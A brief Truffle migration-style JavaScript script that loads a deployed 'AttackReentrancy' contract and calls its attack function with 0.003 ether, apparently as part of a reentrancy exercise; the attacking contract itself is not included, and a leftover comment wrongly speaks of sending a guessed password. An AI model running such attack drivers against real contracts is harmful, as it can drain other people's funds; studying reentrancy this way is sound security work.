const AttackReentrancy = artifacts.require("AttackReentrancy");

module.exports = async function (callback) {
  try {
    // Get the deployed instance of the AttackReentrancy contract
    const attackInstance = await AttackReentrancy.deployed();
    console.log(
      `Attack contract deployed at address: ${attackInstance.address}`
    );

    // Send the guessed password to the contract
    const tx = await attackInstance.attack({
      value: web3.utils.toWei("0.003", "ether"),
    });
    console.log("Attack transaction sent:", tx.tx);

    callback();
  } catch (error) {
    console.error(error);
    callback(error);
  }
};
